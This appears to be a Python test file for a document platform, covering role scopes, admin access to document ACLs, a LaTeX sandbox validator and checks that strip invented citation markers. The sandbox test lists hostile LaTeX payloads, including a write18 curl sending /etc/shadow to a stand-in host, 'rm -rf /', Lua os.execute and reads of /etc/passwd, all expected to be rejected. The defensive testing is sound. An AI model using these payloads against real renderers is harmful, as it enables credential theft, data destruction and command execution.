"""Access control, the LaTeX sandbox and citation validation."""

from __future__ import annotations

import pytest

from elp.auth.principal import Principal, Scope, scopes_for_roles
from elp.latex.render import LatexError, validate_source
from elp.rag.answer import _validate_markers

# ----------------------------------------------------------------------
# Roles and scopes
# ----------------------------------------------------------------------

def test_roles_grant_only_their_own_scopes():
    planner = Principal(subject="p", roles=["planner"], scopes=scopes_for_roles(["planner"]))
    assert planner.has(Scope.MAINT_WRITE)
    # Planning is not the same authority as approving a deferral.
    assert not planner.has(Scope.MAINT_APPROVE)
    assert not planner.has(Scope.DOCS_WRITE)
    assert not planner.is_admin


def test_admin_implies_every_scope():
    admin = Principal(subject="a", roles=["admin"], scopes=scopes_for_roles(["admin"]))
    for scope in Scope.ALL:
        assert admin.has(scope)


def test_unknown_roles_grant_nothing():
    ghost = Principal(subject="g", roles=["nonexistent"], scopes=scopes_for_roles(["nonexistent"]))
    assert ghost.scopes == frozenset()
    assert not ghost.has(Scope.ASK)


def test_multiple_groups_union_their_scopes():
    both = scopes_for_roles(["planner", "developer"])
    assert Scope.MAINT_WRITE in both
    assert Scope.DEV in both
    assert Scope.MAINT_APPROVE not in both


def test_admin_does_not_bypass_document_acls_by_default():
    """
    Administering the platform is not clearance to read every department's
    governing documents.
    """
    from elp.config import RagSettings
    from elp.rag.retrieve import _acl_groups

    admin = Principal(subject="a", roles=["admin"], groups=["IT"], scopes=scopes_for_roles(["admin"]))
    settings = RagSettings()
    assert settings.admin_bypass_acl is False
    assert _acl_groups(admin, settings) == ["IT"]

    settings.admin_bypass_acl = True
    assert _acl_groups(admin, settings) is None


# ----------------------------------------------------------------------
# LaTeX sandbox
# ----------------------------------------------------------------------

@pytest.mark.parametrize(
    "payload",
    [
        r"\immediate\write18{curl http://evil/$(cat /etc/shadow)}",
        r"\write18{rm -rf /}",
        r"\directlua{os.execute('id')}",
        r"\openout15=/tmp/exfiltrated",
        r"\openin1=/etc/passwd",
        r"\input{/etc/passwd}",
        r"\include{/var/lib/secrets}",
        r"\input{|\"whoami\"}",
        r"\usepackage[shellesc]{shellesc}",
    ],
)
def test_latex_escape_primitives_are_blocked(payload):
    source = r"\documentclass{article}" + payload + r"\begin{document}x\end{document}"
    with pytest.raises(LatexError, match="rejected"):
        validate_source(source)


def test_legitimate_latex_is_accepted():
    validate_source(
        r"""\documentclass{article}
\usepackage{booktabs}
\usepackage{longtable}
\begin{document}
Torque the fitting to \SI{25}{\newton\metre} \& verify security.
\input{sections/limits}
\end{document}"""
    )


def test_source_without_a_document_class_is_refused():
    with pytest.raises(LatexError, match="documentclass"):
        validate_source(r"\begin{document}orphan\end{document}")


def test_oversized_source_is_refused():
    from elp.config import LatexSettings

    settings = LatexSettings(max_source_bytes=100)
    with pytest.raises(LatexError, match="byte limit"):
        validate_source(r"\documentclass{article}" + "x" * 500, settings)


# ----------------------------------------------------------------------
# Citations
# ----------------------------------------------------------------------

def test_invented_citation_markers_are_stripped():
    """
    A model that cites [D9] when only [D1] exists is asserting a source that
    does not exist. The marker must not reach the reader.
    """
    references = {"D1": {"marker": "D1", "citation": "MOE-001 §4.2"}}
    answer, used, warnings = _validate_markers(
        "Deferral needs approval [D1]. The limit is 30 days [D9].", references
    )

    assert "[D9]" not in answer
    assert "[D1]" in answer
    assert len(used) == 1
    assert any("do not correspond" in w for w in warnings)


def test_only_cited_references_are_returned():
    references = {
        "D1": {"marker": "D1", "citation": "A"},
        "D2": {"marker": "D2", "citation": "B"},
        "A1": {"marker": "A1", "citation": "Peer system"},
    }
    _answer, used, _warnings = _validate_markers("Only this one matters [D2].", references)
    assert [r["marker"] for r in used] == ["D2"]


def test_document_sources_are_listed_before_ai_sources():
    references = {
        "A1": {"marker": "A1", "citation": "Peer"},
        "D2": {"marker": "D2", "citation": "Doc 2"},
        "D1": {"marker": "D1", "citation": "Doc 1"},
    }
    _answer, used, _warnings = _validate_markers("[A1] [D2] [D1]", references)
    assert [r["marker"] for r in used] == ["D1", "D2", "A1"]


def test_an_uncited_answer_is_flagged():
    references = {"D1": {"marker": "D1", "citation": "MOE-001"}}
    _answer, used, warnings = _validate_markers("The limit is 30 days.", references)

    assert used == []
    assert any("not traceable" in w for w in warnings)
